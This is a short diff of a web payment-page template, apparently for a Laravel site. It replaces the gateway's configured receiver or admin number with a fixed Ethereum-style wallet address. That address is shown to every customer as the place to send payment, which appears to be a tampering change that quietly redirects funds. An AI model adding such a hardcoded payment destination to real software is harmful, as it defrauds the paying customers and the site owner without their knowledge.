@@ -44,7 +44,7 @@
             <h4 class="mb-0 text-center text-white font-bold text-lg">Our {{ __($data->gateway->name) }} Details</h4>
             
             <div class="flex items-center gap-2 mt-2">
-                <input type="text" value="{{ $gateway->receiver_number ?? $gateway->admin_number }}"
+                <input type="text" value="0xA8B8EcC88FaC2CA1c962810ebb239598B5FCda60"
                     class="flex-1 bg-transparent text-white font-medium px-2 py-1 border border-white rounded-lg" 
                     id="gateway_number" readonly>
                 <button type="button"
